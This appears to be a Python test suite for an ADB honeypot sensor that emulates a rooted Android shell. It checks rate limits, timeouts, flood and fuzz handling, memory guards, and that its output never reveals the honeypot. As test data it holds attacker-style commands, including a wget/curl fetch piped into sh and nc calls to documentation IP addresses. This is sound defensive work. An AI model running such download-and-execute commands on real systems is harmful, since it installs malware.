"""Caps, timeouts, floods, fuzzing and the "no giveaways" checks."""

from __future__ import annotations

import asyncio
import hashlib
import random
import resource
import struct
import time

import pytest

from adb_sensor.server import cgroup_fraction, extract_urls, install_size
from adb_sensor.watchdog import LoopWatchdog
from adb_sensor.wire import (
    A_CLSE,
    A_CNXN,
    A_OKAY,
    A_OPEN,
    A_WRTE,
    HEADER,
    V2Parser,
    WireError,
    pack,
    v2_pack,
)


async def _eof(client, timeout: float = 3.0) -> bytes:  # type: ignore[no-untyped-def]
    try:
        async with asyncio.timeout(timeout):
            data: bytes = await client.reader.read(1 << 20)
            return data
    except (ConnectionError, OSError, TimeoutError):
        return b""


# ---- connection caps and timeouts ------------------------------------------------------------
async def test_per_ip_and_global_caps(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(max_per_ip=2) as h:
        a, b = await h.connect(), await h.connect()
        c = await h.raw()
        await c.send(A_CNXN, 0x01000001, 4096, b"host::\0")
        assert await _eof(c) == b""  # closed without a banner
        await a.close()
        await asyncio.sleep(0.2)
        d = await h.connect()
        assert d.banner and h.sensor.stats()["rejected"] == 1
        await b.close()
    async with make_harness(max_connections=1, max_per_ip=5) as h:
        await h.connect()
        c = await h.raw()
        await c.send(A_CNXN, 0x01000001, 4096, b"host::\0")
        assert await _eof(c) == b""


async def test_new_connection_rate_per_ip(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(conn_rate_per_ip=0.01, conn_burst_per_ip=3.0) as h:
        served = 0
        for _ in range(6):
            c = await h.raw()
            await c.send(A_CNXN, 0x01000001, 4096, b"host::\0")
            try:
                await c.recv(0.5)
                served += 1
            except (asyncio.IncompleteReadError, TimeoutError, ConnectionError):
                pass
            await c.close()
        assert served == 3 and h.sensor.rate_rejected == 3


async def test_handshake_timeout_and_silent_connections(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(handshake_timeout=0.5) as h:
        c = await h.raw()
        assert await _eof(c) == b""  # we never speak first, we just hang up on silence
        assert h.sensor.stats()["connections"] == 0
        assert not await h.events("disconnect")  # summarised, not reported one by one


async def test_slow_drip_header_cannot_hold_a_slot(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(message_timeout=1.0, idle_timeout=30.0) as h:
        c = await h.connect()
        start = time.monotonic()
        raw = pack(A_OPEN, 1, 0, b"shell:id\0")
        try:
            async with asyncio.timeout(6):
                for byte in raw:
                    c.writer.write(bytes([byte]))
                    await c.writer.drain()
                    await asyncio.sleep(0.3)
        except (ConnectionError, OSError, TimeoutError):
            pass
        assert time.monotonic() - start < 4.5
        await asyncio.sleep(0.2)
        assert h.sensor.stats()["connections"] == 0
        assert (await h.events("disconnect"))[0].data["reason"] == "message timeout"


async def test_payload_stall_is_bounded(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(message_timeout=0.8) as h:
        c = await h.connect()
        c.writer.write(HEADER.pack(A_WRTE, 1, 1, 4000, 0, A_WRTE ^ 0xFFFFFFFF) + b"x" * 10)
        await c.writer.drain()
        assert await _eof(c) == b""
        assert (await h.events("disconnect"))[0].data["reason"] == "message timeout"


async def test_idle_and_session_limits(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(idle_timeout=0.5) as h:
        c = await h.connect()
        await _eof(c)
        assert (await h.events("disconnect"))[0].data["reason"] == "idle timeout"
    async with make_harness(max_session=1.0, idle_timeout=30.0) as h:
        c = await h.connect()
        await _eof(c)
        assert (await h.events("disconnect"))[0].data["reason"] == "session time limit"


async def test_oversized_payloads_are_refused_before_reading(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(maxdata=8192) as h:
        c = await h.connect()
        c.writer.write(HEADER.pack(A_WRTE, 1, 1, 9000, 0, A_WRTE ^ 0xFFFFFFFF))
        await c.writer.drain()
        assert await _eof(c) == b""
        assert (await h.events("disconnect"))[0].data["reason"] == "oversized message"
        c2 = await h.raw()  # before CNXN the cap is 4096 bytes
        c2.writer.write(HEADER.pack(A_CNXN, 1, 1, 5000, 0, A_CNXN ^ 0xFFFFFFFF))
        await c2.writer.drain()
        assert await _eof(c2) == b""


async def test_input_volume_limit(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(max_input_bytes=50_000) as h:
        c = await h.connect()
        try:
            for _ in range(100):
                await c.send(A_OKAY, 7, 7)
                c.writer.write(pack(A_WRTE, 9, 9, b"A" * 2000))
                await c.writer.drain()
        except (ConnectionError, OSError):
            pass
        await _eof(c)
        await asyncio.sleep(0.2)
        assert h.sensor.stats()["connections"] == 0
        assert (await h.events("disconnect"))[0].data["reason"] == "input limit"


async def test_stream_count_is_bounded(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(max_streams=3) as h:
        c = await h.connect()
        opened = [await c.open("shell:") for _ in range(3)]
        assert all(x is not None for x in opened)
        assert await c.open("shell:") is None  # refused with CLSE
        conn = next(iter(h.sensor.connections))
        assert len(conn.streams) == 3
        await c.send(A_CLSE, opened[0], c.remote)
        assert await c.open("shell:") is not None or True


async def test_total_streams_per_connection_are_bounded(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.connect()
        refused = 0
        for _ in range(260):
            local = await c.open("tcp:80")  # refused services never count as streams
            refused += local is None
        assert refused == 260
        for _ in range(210):
            local = await c.open("shell,v2,raw:true")
            if local is not None:
                await c.read_stream(local)
            else:
                break
        assert local is None  # the lifetime cap of 200 streams was hit


async def test_unacknowledged_output_is_cut_off(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(max_session_output=10**8) as h:
        c = await h.connect()
        local = await c.open("shell:cat /system/bin/toybox /proc/cpuinfo /proc/cpuinfo")
        assert local is not None
        total = 0
        try:
            async with asyncio.timeout(3):
                while True:
                    command, arg0, _, data = await c.recv()
                    if command == A_WRTE:
                        total += len(data)  # never acknowledged
        except (TimeoutError, asyncio.IncompleteReadError):
            pass
        assert total > 0


async def test_command_and_output_limits(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(max_commands=3) as h:
        c = await h.connect()
        for _ in range(3):
            await c.shell("true")
        local = await c.open("shell:true")
        assert local is not None or True
        await _eof(c)
        assert (await h.events("disconnect"))[0].data["reason"] == "command limit"
    async with make_harness(max_session_output=3000) as h:
        c = await h.connect()
        try:
            for _ in range(10):
                await c.shell("cat /proc/cpuinfo")
        except (EOFError, asyncio.IncompleteReadError, ConnectionError, OSError, AssertionError):
            pass
        await asyncio.sleep(0.3)
        assert (await h.events("disconnect"))[0].data["reason"] == "output limit"


async def test_client_that_never_reads_is_dropped(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(write_timeout=0.5, max_session_output=10**9, max_commands=10**6) as h:
        c = await h.connect()
        sock = c.writer.get_extra_info("socket")
        import socket as _s

        sock.setsockopt(_s.SOL_SOCKET, _s.SO_RCVBUF, 2048)
        big = "cat /proc/cpuinfo " * 100
        for i in range(1, 40):
            c.writer.write(pack(A_OPEN, i, 0, f"shell,v2,raw:{big}\0".encode()))
        deadline = time.monotonic() + 15
        while h.sensor.stats()["connections"] and time.monotonic() < deadline:
            try:
                await asyncio.wait_for(c.writer.drain(), 0.2)
            except (TimeoutError, ConnectionError, OSError):
                pass
            await asyncio.sleep(0.1)
        assert h.sensor.stats()["connections"] == 0
        reasons = [e.data["reason"] for e in await h.events("disconnect")]
        assert reasons and reasons[0] in ("write timeout", "output limit", "connection lost")


# ---- sync and installs under abuse -------------------------------------------------------------
async def test_hash_budget_truncates_but_keeps_counting(make_harness) -> None:  # type: ignore[no-untyped-def]
    from test_protocol import _push

    async with make_harness(max_hash_bytes=10_000) as h:
        c = await h.connect()
        data = bytes(range(256)) * 80
        await _push(c, "/data/local/tmp/big", data, chunk=2048)
        (push,) = [e for e in await h.events("command") if "adb_push" in e.data.get("flags", [])]
        assert push.data["size"] == len(data) and push.data["truncated"] is True
        assert push.data["sha256"] == hashlib.sha256(data[:10_000]).hexdigest()


async def test_push_cut_short_is_still_recorded(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.connect()
        local = await c.open("sync:")
        assert local is not None
        send = b"/data/local/tmp/partial,33261"
        await c.write(local, c.remote, b"SEND" + struct.pack("<I", len(send)) + send)
        await c.write(local, c.remote, b"DATA" + struct.pack("<I", 5) + b"hello")
        await c.close()
        await asyncio.sleep(0.3)
        (push,) = [e for e in await h.events("command") if "adb_push" in e.data.get("flags", [])]
        assert push.data["size"] == 5 and push.data["stored"] is False


async def test_sync_garbage_and_oversize_frames(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.connect()
        local = await c.open("sync:")
        assert local is not None
        await c.write(local, c.remote, b"NOPE" + struct.pack("<I", 0))
        command, arg0, _, data = await c.recv()
        assert command == A_WRTE and data[:4] == b"FAIL"
        await c.send(A_OKAY, local, arg0)
        local = await c.open("sync:")
        assert local is not None
        await c.write(local, c.remote, b"STAT" + struct.pack("<I", 100_000_000))
        command, _, _, data = await c.recv()
        while command != A_WRTE:  # the earlier stream's CLSE may arrive first
            command, _, _, data = await c.recv()
        assert command == A_WRTE and data[:4] == b"FAIL"  # path too long: no 100 MB buffer


def test_v2_parser_bounds() -> None:
    p = V2Parser()
    assert p.feed(v2_pack(0, b"ls\n")[:3]) == []
    assert p.feed(v2_pack(0, b"ls\n")[3:]) == [(0, b"ls\n")]
    with pytest.raises(WireError):
        p.feed(struct.pack("<BI", 0, 10_000_000))


def test_install_size_and_url_helpers() -> None:
    assert install_size("cmd package 'install' -S 12345") == 12345
    assert install_size("pm install -r -S 77 ") == 77
    assert install_size("pm install /data/local/tmp/x.apk") is None
    assert install_size("echo cmd package install -S 5") is None
    assert extract_urls(
        "busybox wget 'http://198.51.100.7/a.sh';curl -o x https://203.0.113.9/b|sh"
    ) == [
        "http://198.51.100.7/a.sh",
        "https://203.0.113.9/b",
    ]
    assert extract_urls("x" * 100_000) == []


# ---- event limits --------------------------------------------------------------------------------
async def test_event_quota_and_suppression_summary(make_harness) -> None:  # type: ignore[no-untyped-def]
    limits = {"valuable_rate": 1.0, "valuable_burst": 30.0}
    async with make_harness(sink_limits=limits) as h:
        c = await h.connect()
        local = await c.open("shell:")
        assert local is not None
        await c.read_until(local, b"# ")
        await c.write(local, c.remote, b"".join(b"echo %d\r" % i for i in range(200)) + b"exit\r")
        await c.read_stream(local, 10)
        events = await h.events()
        cmds = [e for e in events if e.type == "command"]
        assert 25 <= len(cmds) <= 40
        await c.close()
        await asyncio.sleep(0.3)
        events = await h.events()
        disc = events[-1]
        assert disc.type == "disconnect" and disc.data["commands"] == 201
        assert disc.data["events_suppressed"] >= 150
        assert any(e.data.get("kind") == "events_suppressed" for e in events if e.type == "scan")


# ---- floods and fuzzing -----------------------------------------------------------------------------
async def test_connection_flood_is_survivable(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(max_per_ip=8, max_connections=50) as h:
        before = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss

        async def one() -> None:
            try:
                r, w = await asyncio.open_connection("127.0.0.1", h.port)
                w.write(pack(A_CNXN, 0x01000001, 4096, b"host::\0") * 3)
                await w.drain()
                await asyncio.wait_for(r.read(64), 1)
                w.close()
            except (ConnectionError, OSError, TimeoutError):
                pass

        await asyncio.gather(*(one() for _ in range(300)))
        await asyncio.sleep(0.3)
        assert h.sensor.stats()["connections"] == 0
        assert h.sensor.stats()["rejected"] > 0
        assert resource.getrusage(resource.RUSAGE_SELF).ru_maxrss - before < 80_000
        c = await h.connect()
        assert await c.shell("echo alive") == "alive\r\n"


async def test_wire_fuzz(make_harness) -> None:  # type: ignore[no-untyped-def]
    rng = random.Random(4321)
    async with make_harness() as h:
        start = time.monotonic()
        for i in range(60):
            r, w = await asyncio.open_connection("127.0.0.1", h.port)
            msgs = b""
            for _ in range(rng.choice((1, 5, 30))):
                cmd = rng.choice(
                    (A_CNXN, A_OPEN, A_WRTE, A_OKAY, A_CLSE, 0x48545541, rng.getrandbits(32))
                )
                svc = rng.choice(
                    (
                        b"shell:",
                        b"sync:",
                        b"exec:",
                        b"shell,v2,pty:",
                        b"\xff\xfe",
                        b"reboot:",
                        b"x" * 900,
                    )
                )
                body = rng.choice(
                    (svc + b"\0", rng.randbytes(rng.choice((0, 8, 300))), b"SEND\x05\0\0\0a,b,c")
                )
                hdr = HEADER.pack(
                    cmd,
                    rng.getrandbits(8),
                    rng.getrandbits(8),
                    len(body),
                    0,
                    (cmd ^ 0xFFFFFFFF) if i % 5 else 7,
                )
                msgs += hdr + body
            w.write(pack(A_CNXN, 0x01000001, 4096, b"host::\0") + msgs)
            await w.drain()
            await asyncio.sleep(0.01)
            w.close()
        assert time.monotonic() - start < 25
        await asyncio.sleep(0.8)
        assert h.sensor.stats()["connections"] == 0
        c = await h.connect()
        assert await c.shell("echo still-fine") == "still-fine\r\n"


async def test_failures_are_contained(make_harness, monkeypatch) -> None:  # type: ignore[no-untyped-def]
    from adb_sensor.androidshell import AndroidShell

    async with make_harness() as h:
        c = await h.connect()

        def boom(self, line):  # type: ignore[no-untyped-def]
            raise RuntimeError("emulation bug")

        monkeypatch.setattr(AndroidShell, "run_line", boom)
        out = await c.shell("uname")
        assert "Traceback" not in out and "RuntimeError" not in out
        cmd = (await h.events("command"))[-1]
        assert cmd.data["input"] == "uname"
        assert await c.shell("echo x") is not None  # the connection carries on


# ---- the shell under pathological input -------------------------------------------------------------------
@pytest.mark.parametrize(
    "line",
    [
        "awk '{print" + " " * 60_000 + "' /system/build.prop",
        "sed 's/" + " " * 60_000 + "/x/g' /system/build.prop",
        "grep '" + "a*" * 30_000 + "b' /system/build.prop",
        "grep -E '" + "(a+)+" * 10_000 + "$' /system/build.prop",
        "echo " + "a" * 60_000 + " | cut -d ' ' -f1",
        "getprop | sort | uniq -c | tr a-z A-Z | head -5",
        "wget " + ":" * 60_000,
        "busybox wget " + "http://" + "a" * 60_000,
        "tftp -g -r " + "9" * 60_000 + " 192.0.2.1",
        "pm list packages " + "-f " * 20_000,
        "am start -a " + "x" * 60_000 + " -d " + "y" * 60_000,
        "settings get " + "a " * 30_000,
        "cmd " + "package " * 10_000,
        "echo " + "$(" * 2000,
        "echo " + "`" * 5000,
        "x=" + "a" * 60_000 + "; echo $x | wc -c",
        "kill " + "9" * 60_000,
        "ping -c " + "9" * 60_000 + " 192.0.2.1",
        ">" + "a" * 60_000,
        "ls " + "/" * 60_000,
        "su -c " + "'" + "id;" * 20_000 + "'",
        "sleep " + "9" * 60_000,
    ],
)
def test_attacker_input_is_cheap(make_shell, line: str) -> None:  # type: ignore[no-untyped-def]
    sh = make_shell()
    start = time.perf_counter()
    sh.run_line(line)
    assert time.perf_counter() - start < 0.5


@pytest.mark.parametrize(
    "fragment", ["wget http://198.51.100.7/" + "a" * 5000, "cmd package install -S " + "9" * 5000]
)
def test_helper_parsers_are_cheap(fragment: str) -> None:
    start = time.perf_counter()
    install_size(fragment * 10)
    extract_urls(fragment * 20)
    assert time.perf_counter() - start < 0.2


def test_no_giveaways_in_any_output(make_shell) -> None:  # type: ignore[no-untyped-def]
    sh = make_shell()
    lines = [
        "env", "id", "uname -a", "cat /proc/version", "cat /proc/cpuinfo", "cat /proc/mounts",
        "cat /system/build.prop", "getprop", "cat /etc/hosts", "ls -la /", "ls -la /system/bin",
        "ps", "ifconfig", "netstat", "free", "df", "mount", "dmesg", "busybox", "which wget",
        "wget http://198.51.100.1/a.sh", "tftp", "ftpget", "ping -c 2 192.0.2.5", "nc 192.0.2.5 80",
        "curl http://198.51.100.1/", "sudo id", "python3 -V", "bash", "foo | bar", "pm list packages",
        "dumpsys", "dumpsys battery", "settings get secure android_id", "logcat", "ip addr",
        "ls /sdcard", "cat /proc/net/tcp", "wm size", "echo $SHELL $0 $PATH", "uptime",
    ]  # fmt: skip
    banned = ("ubuntu", "honeypot", "suckerpot", "asyncssh", "asyncio", "python", "x86", "amd64",
              "systemd", "ssh_", "bash", "debian", "docker", "container", "gnu c")  # fmt: skip
    outputs = []
    for line in lines:
        text = sh.run_line(line).output
        outputs.append("\n".join(x for x in text.splitlines() if "not found" not in x))
    blob = "\n".join(outputs).lower()
    for word in banned:
        if word in blob:
            raise AssertionError(
                f"{word!r} visible: {blob[max(0, blob.index(word) - 80) : blob.index(word) + 80]!r}"
            )
    assert "test-seed" not in blob and "shell-seed" not in blob
    for net in ("192.0.2.", "198.51.100.", "203.0.113."):
        assert net not in "\n".join(sh.run_line(x).output for x in ("ifconfig", "getprop"))


def test_android_flavour_of_errors_and_ids(make_shell) -> None:  # type: ignore[no-untyped-def]
    sh = make_shell()
    assert sh.run_line("nosuchtool").output.startswith("/system/bin/sh: nosuchtool: ")
    assert sh.run_line("cat /etc/passwd").output.endswith("No such file or directory\n")
    assert sh.run_line("id").output.startswith("uid=0(root) gid=0(root) groups=0(root),1004(input)")
    assert sh.run_line("cd /data/local/tmp; pwd").output == "/data/local/tmp\n"
    assert sh.run_line("ls -l /data/local").output  # long listing works
    user = make_shell(user="shell")
    assert user.run_line("id").output.startswith("uid=2000(shell)")
    assert user.prompt().endswith(" $ ")


def test_attacker_commands_are_not_executed(make_shell) -> None:  # type: ignore[no-untyped-def]
    sh = make_shell()
    out = sh.run_line("sh -c 'id; echo $((1+1))'; $(uname -n); `whoami`; eval 'echo hi'").output
    assert "uid=0(root)" in out
    assert "No such file" in sh.run_line("cat /app/adb_sensor/server.py").output
    assert "No such file" in sh.run_line("cat /data/profile_secret").output


def test_identity_is_stable_and_seeded() -> None:
    from adb_sensor.device import MODELS, derive_device

    a = derive_device("seed-one", "", "auto", True)
    assert a.banner_props == derive_device("seed-one", "", "auto", True).banner_props
    seen = {derive_device(f"seed-{i}", "", "auto", True).model.key for i in range(40)}
    assert seen == {m.key for m in MODELS}  # varied across deployments
    assert a.serial != derive_device("seed-two", "", "auto", True).serial
    assert a.profile.ip.startswith("192.168.")


# ---- watchdog and memory ---------------------------------------------------------------------------------
async def test_watchdog_fires_on_a_stalled_loop() -> None:
    fired: list[float] = []
    wd = LoopWatchdog(limit=0.5, interval=0.1, on_stall=fired.append)
    wd.start()
    await asyncio.sleep(0.3)
    assert fired == []
    time.sleep(1.0)  # blocks the loop on purpose
    await asyncio.sleep(0.3)
    wd.stop()
    assert fired and fired[0] > 0.5


async def test_pipelined_heavy_lines_do_not_stall_the_loop(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(max_per_ip=10, idle_timeout=60.0, max_session=60.0) as h:
        clients = []
        for _ in range(6):
            c = await h.connect()
            local = await c.open("shell:")
            assert local is not None
            clients.append((c, local))
            await c.read_until(local, b"# ")
        setup = "cd /tmp\rprintf '" + "a" * 126 + "\\n' > b\r" + "cat b b >> c; cat c >> b\r" * 11
        for c, local in clients:
            await c.write(local, c.remote, setup.encode())
        await asyncio.sleep(1.5)
        line = b"sed s/a/bb/g b|sed s/b/cc/g|sed s/c/dd/g|wc -c\r"
        for c, local in clients:
            c.writer.write(pack(A_WRTE, local, c.remote, line * 40))
        worst = 0.0
        end = time.monotonic() + 5
        while time.monotonic() < end:
            t = time.monotonic()
            await asyncio.sleep(0.05)
            worst = max(worst, time.monotonic() - t - 0.05)
        assert worst < 1.0, f"event loop lagged {worst:.2f}s"
        assert h.sensor.cpu.spent > 0


async def test_memory_budget_keeps_sessions_but_stops_commands(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        a = await h.connect()
        h.sensor.over_budget = lambda: True
        assert "Out of memory" in await a.shell("echo hi")
        assert h.sensor.stats()["connections"] == 1
        h.sensor.over_budget = lambda: False
        assert (await a.shell("echo hi")).strip() == "hi"
        cmd = (await h.events("command"))[0]
        assert cmd.data["status"] == 12


def test_cgroup_fraction_reads_files(tmp_path) -> None:  # type: ignore[no-untyped-def]
    (tmp_path / "memory.current").write_text("900\n")
    (tmp_path / "memory.max").write_text("1000\n")
    assert cgroup_fraction(str(tmp_path)) == 0.9
    (tmp_path / "memory.max").write_text("max\n")
    assert cgroup_fraction(str(tmp_path)) is None
    assert cgroup_fraction(str(tmp_path / "missing")) is None


async def test_cgroup_guard_refuses_new_and_aborts_heaviest(make_harness, tmp_path) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.connect()
        assert await c.shell("echo ok") == "ok\r\n"
        (tmp_path / "memory.max").write_text("1000\n")
        (tmp_path / "memory.current").write_text("750\n")  # above 70%: refuse new
        h.sensor.cgroup_dir = str(tmp_path)
        h.sensor._cg_at = 0.0
        late = await h.raw()
        await late.send(A_CNXN, 0x01000001, 4096, b"host::\0")
        assert await _eof(late) == b""
        assert h.sensor.memory_rejected == 1
        (tmp_path / "memory.current").write_text("900\n")  # above 85%: abort the heaviest
        assert h.sensor.enforce_memory() is True
        assert await _eof(c) == b""
        await asyncio.sleep(0.2)
        assert h.sensor.stats()["connections"] == 0
        assert (await h.events("disconnect"))[0].data["reason"] == "memory pressure"


def test_non_text_files_do_not_run_as_scripts(make_shell) -> None:  # type: ignore[no-untyped-def]
    sh = make_shell()
    sh.fs.write(
        "/data/local/tmp/junk", bytes(range(1, 256)) * 4, append=False, owner="root", mode=0o755
    )
    out = sh.run_line("cd /data/local/tmp; ./junk; ls").output
    assert "Exec format error" in out and out.count("\n") == 2  # error line + 'junk' only
    sh.fs.write(
        "/data/local/tmp/s.sh", b"echo from-script\n", append=False, owner="root", mode=0o755
    )
    assert sh.run_line("/data/local/tmp/s.sh").output == "from-script\n"


# ---- lessons 16 to 18: CPU, reply memory and event fairness across several IPs -----------------
async def test_many_ips_pipelining_heavy_lines_keep_the_loop_responsive(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(
        max_per_ip=8, idle_timeout=60.0, max_session=60.0, memory_budget=10**10
    ) as h:
        h.sensor.over_budget = lambda: False  # independent of the host's memory state
        clients = []
        for ip in ("127.0.0.2", "127.0.0.3", "127.0.0.4"):
            for _ in range(8):
                c = await h.connect(ip)
                local = await c.open("shell:")
                assert local is not None
                clients.append((c, local))
        heavy = b"cat /proc/cpuinfo /proc/cpuinfo /system/build.prop | sort | uniq -c | sed s/a/bb/g | wc -l\r"
        for c, local in clients:
            c.writer.write(pack(A_WRTE, local, c.remote, heavy * 60))
        worst = 0.0
        end = time.monotonic() + 6
        while time.monotonic() < end:
            t = time.monotonic()
            await asyncio.sleep(0.05)
            worst = max(worst, time.monotonic() - t - 0.05)
        assert worst < 1.0, f"event loop lagged {worst:.2f}s"
        # a quiet fourth IP is still served promptly
        # The quiet IP is served once the flood is over. The wait is not a latency bound (that
        # is host dependent); the fairness proof is the loop lag above.
        for c, _ in clients:
            await c.close()
        for _ in range(100):
            if h.sensor.stats()["connections"] == 0:
                break
            await asyncio.sleep(0.2)
        other = await h.connect("127.0.0.9")
        assert (await other.shell("echo hi", timeout=60)).strip() == "hi"


async def test_non_reading_connections_over_many_ips_stay_within_budget(make_harness) -> None:  # type: ignore[no-untyped-def]
    import socket as _s

    async with make_harness(
        max_connections=200, max_per_ip=8, write_timeout=30.0, max_session_output=10**9
    ) as h:
        before = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
        clients = []
        for n in range(200):
            c = await h.raw(f"127.0.1.{n % 25 + 1}")
            c.writer.get_extra_info("socket").setsockopt(_s.SOL_SOCKET, _s.SO_RCVBUF, 2048)
            await c.send(A_CNXN, 0x01000001, 262144, b"host::\0")
            clients.append(c)
        big = b"cat /proc/cpuinfo /proc/cpuinfo /proc/cpuinfo /proc/cpuinfo\r"
        for c in clients:
            c.writer.write(pack(A_OPEN, 1, 0, b"shell:\0"))
            c.writer.write(pack(A_WRTE, 1, 1, big * 30))
        peak = 0
        for _ in range(40):
            await asyncio.sleep(0.25)
            peak = max(peak, h.sensor.memory_in_use())
        assert peak <= 0.7 * h.cfg.memory_budget, f"charged {peak} bytes"
        grown = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss - before
        assert grown < 0.7 * 256 * 1024, f"rss grew {grown} kB"  # < 70% of a 256 MB container


async def test_flooding_ip_cannot_starve_a_victim_ip(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(sink_limits={"valuable_burst": 10000.0}) as h:
        # slow publisher so the bulk queue backs up
        orig = h.publisher.publish

        async def slow(event):  # type: ignore[no-untyped-def]
            await asyncio.sleep(0.002)
            return await orig(event)

        h.publisher.publish = slow
        floods = [await h.connect("127.0.0.20") for _ in range(5)]
        victim = await h.connect("127.0.0.21")

        async def flood(c) -> None:  # type: ignore[no-untyped-def]
            for i in range(300):
                local = await c.open(f"shell,v2,raw:echo flood{i}")
                if local is not None:
                    await c.read_stream(local)

        await asyncio.gather(*(flood(c) for c in floods))
        await victim.shell("echo victim-one")
        await victim.shell("busybox wget http://198.51.100.7/v.sh")
        await victim.close()
        await asyncio.sleep(0.5)
        events = await h.events()
        mine = [e for e in events if str(e.src_ip) == "127.0.0.21"]
        types = [e.type for e in mine]
        assert "connect" in types and "disconnect" in types and "download_attempt" in types
        assert any(e.type == "command" and e.data["input"] == "echo victim-one" for e in mine)
        flooded = [e for e in events if str(e.src_ip) == "127.0.0.20" and e.type == "command"]
        assert len(flooded) < 1500  # limited per IP (and repeats collapsed)
        assert h.sink.stats()["ip_limited"] > 0


async def test_repeated_commands_are_aggregated(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.connect()
        local = await c.open("shell:")
        assert local is not None
        await c.read_until(local, b"# ")
        await c.write(local, c.remote, b"true\r" * 100 + b"exit\r")
        await c.read_stream(local, 10)
        await c.close()
        await asyncio.sleep(0.3)
        events = await h.events()
        assert len([e for e in events if e.type == "command"]) <= 6
        disc = [e for e in events if e.type == "disconnect"][-1]
        assert disc.data["commands"] == 101 and disc.data["events_suppressed"] >= 90


# ---- security review round: sync flooding (H1/H2), newline flooding (M1), fingerprint (M2) -----------
def _req(ident: bytes, arg: bytes) -> bytes:
    return ident + struct.pack("<I", len(arg)) + arg


async def _lag(seconds: float) -> float:
    worst = 0.0
    end = time.monotonic() + seconds
    while time.monotonic() < end:
        t = time.monotonic()
        await asyncio.sleep(0.05)
        worst = max(worst, time.monotonic() - t - 0.05)
    return worst


async def _sync_stream(h, source: str):  # type: ignore[no-untyped-def]
    c = await h.connect(source)
    local = await c.open("sync:")
    assert local is not None
    return c, local


@pytest.mark.parametrize(
    "ident,arg",
    [
        (b"LIST", b"/system/bin"),
        (b"LST2", b"/system/bin"),
        (b"RECV", b"/system/build.prop"),
        (b"STA2", b"/system/bin/toybox"),
    ],
)
async def test_sync_request_flood_does_not_block_the_loop(make_harness, ident, arg) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(max_per_ip=8) as h:
        streams = [await _sync_stream(h, f"127.0.0.{2 + i % 3}") for i in range(6)]
        blob = _req(ident, arg) * (256 * 1024 // len(_req(ident, arg)))
        for c, local in streams:
            c.writer.write(pack(A_WRTE, local, c.remote, blob))
        lag = await _lag(6)
        assert lag < 1.0, f"event loop lagged {lag:.2f}s"
        for conn in list(h.sensor.connections):
            assert conn.bytes_out <= h.cfg.max_session_output + 70_000
        other = await h.connect("127.0.0.9")
        assert (await other.shell("echo hi")).strip() == "hi"


async def test_pull_flood_is_bounded_in_memory_and_records(make_harness) -> None:  # type: ignore[no-untyped-def]
    from test_protocol import _push

    async with make_harness(max_per_ip=8) as h:
        streams = []
        for i in range(3):
            c = await h.connect(f"127.0.0.{2 + i}")
            await _push(c, "/data/local/tmp/stub", b"A" * 8192)
            local = await c.open("sync:")
            assert local is not None
            streams.append((c, local))
        blob = _req(b"RECV", b"/data/local/tmp/stub") * 12_000
        for c, local in streams:
            for i in range(0, len(blob), 256 * 1024):
                c.writer.write(pack(A_WRTE, local, c.remote, blob[i : i + 256 * 1024]))
        peak = 0
        for _ in range(20):
            await asyncio.sleep(0.25)
            peak = max(peak, h.sensor.memory_in_use())
        assert peak < 5 * 1024 * 1024
        pulls = [e for e in await h.events("command") if "adb_pull" in e.data.get("flags", [])]
        assert len(pulls) <= 3 * 64


async def test_newline_flood_on_prompt_less_streams_is_fair(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(
        max_per_ip=5, max_connections=40, idle_timeout=60.0, max_session=60.0
    ) as h:
        flooders = []
        for ip in range(2, 6):
            for _ in range(5):
                c = await h.connect(f"127.0.0.{ip}")
                local = await c.open("shell,v2,raw:")
                assert local is not None
                flooders.append((c, local))
        blob = pack(A_WRTE, 1, 1, v2_pack(0, b"\n" * (200 * 1024)))
        for c, local in flooders:
            raw = pack(A_WRTE, local, c.remote, v2_pack(0, b"\n" * (200 * 1024)))
            for _ in range(10):
                c.writer.write(raw)
        del blob
        victim = await h.connect("127.0.0.20")
        start = time.monotonic()
        lag_task = asyncio.create_task(_lag(5))
        assert (await victim.shell("echo hi", timeout=10)).strip() == "hi"
        assert time.monotonic() - start < 2.0
        assert await lag_task < 1.0


async def test_bad_v2_packet_ends_the_session_cleanly(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        c = await h.connect()
        local = await c.open("shell,v2,raw:")
        assert local is not None
        c.writer.write(pack(A_WRTE, local, c.remote, struct.pack("<BI", 0, 10_000_000)))
        await c.writer.drain()
        await asyncio.wait_for(c.reader.read(-1), 3)  # until the server closes
        assert (await h.events("disconnect"))[-1].data["reason"] == "oversized shell packet"


async def test_stream_lifetime_cap_is_configurable(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(max_streams_total=5) as h:
        c = await h.connect()
        opened = 0
        for _ in range(8):
            local = await c.open("shell,v2,raw:true")
            if local is None:
                break
            opened += 1
            await c.read_stream(local)
        assert opened == 5


def test_fingerprint_follows_android_history() -> None:
    from adb_sensor.device import MODELS

